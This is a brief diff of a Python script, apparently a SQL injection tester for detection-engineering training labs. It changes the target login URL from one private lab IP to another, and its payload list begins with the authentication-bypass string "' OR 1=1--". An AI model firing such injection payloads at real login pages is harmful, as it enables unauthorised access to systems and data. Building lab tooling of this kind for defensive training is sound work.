@@ -7,7 +7,7 @@ Used for detection engineering / threat hunting training labs.
 
 import requests
 
-TARGET_URL = "http://192.168.112.133/login"
+TARGET_URL = "http://192.168.112.155/login"
 
 payloads = [
     "' OR 1=1--",
